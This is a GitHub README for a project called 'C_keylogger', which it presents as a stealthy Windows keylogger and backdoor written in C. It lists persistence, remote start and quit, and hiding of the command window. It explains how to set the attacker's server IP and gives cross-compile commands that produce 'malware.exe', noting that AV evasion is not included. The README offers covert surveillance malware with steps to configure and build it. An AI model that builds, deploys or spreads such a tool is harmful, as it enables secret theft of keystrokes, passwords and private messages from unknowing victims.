# C_keylogger
Stealthy Windows keylogger written in C which uses a traditional approach to logging keystrokes (Does not utilise WinAPI hooks)

# Features

- bzero implementation for Windows
- Persistance 
- Remotely start keylogger
- Remote 'quit' which performs _cleanup_
- Reuse of variable via references (lightweight)
- Stealth handler (hides Command Prompt window)

# Table of Contents


# Ammendments Requires Before Compiling

Change the bind IP address in server.c. As the socket will bind to the specified IP address. Alternatively, use _0.0.0.0_ to bind to all interfaces.

https://github.com/safesploit/C_keylogger/blob/7ac1871338175323656e8ff7d8656fba1e92ad7e/server.c#L29

Finally in backdoor.c change the server IP address

https://github.com/safesploit/C_keylogger/blob/7ac1871338175323656e8ff7d8656fba1e92ad7e/backdoor.c#L154


# Compile Instructions

Compilation takes place in a Linux environement.

    (Server/server.c) ~   # sudo apt install mingw-w64 #(required for C compilation)
    (Server/server.c) ~   $ gcc server.c -o server
    (Server/backdoor.c) ~ $ i686-w64-mingw32-gcc -o malware.exe backdoor.c -lwsock32 -lwininet
                          $ i686-w64-mingw32-gcc -o finalproduct.exe backdoor.c -lwsock32 -lwininet


NOTE: backdoor.c is compiled as Win32/x86/i686 to ensure it runs on both x86 and x64 architectures. 
Win32 applications will run on 64-bit Windows due to WoW64.

**Wrapping, encoding or encrpytion for AV evasion are NOT included!**

# Preview Images

## Demonstration of Privileges
<img width="452" alt="image1" src="https://user-images.githubusercontent.com/10171446/153768134-2e3623f6-7733-469f-a2af-d84920e42490.PNG">

## Unwrapped Compiled Malware

<img width="592" alt="image2" src="https://user-images.githubusercontent.com/10171446/153768151-4e5271eb-ae03-4dd4-aec8-d0b73af78a08.PNG">
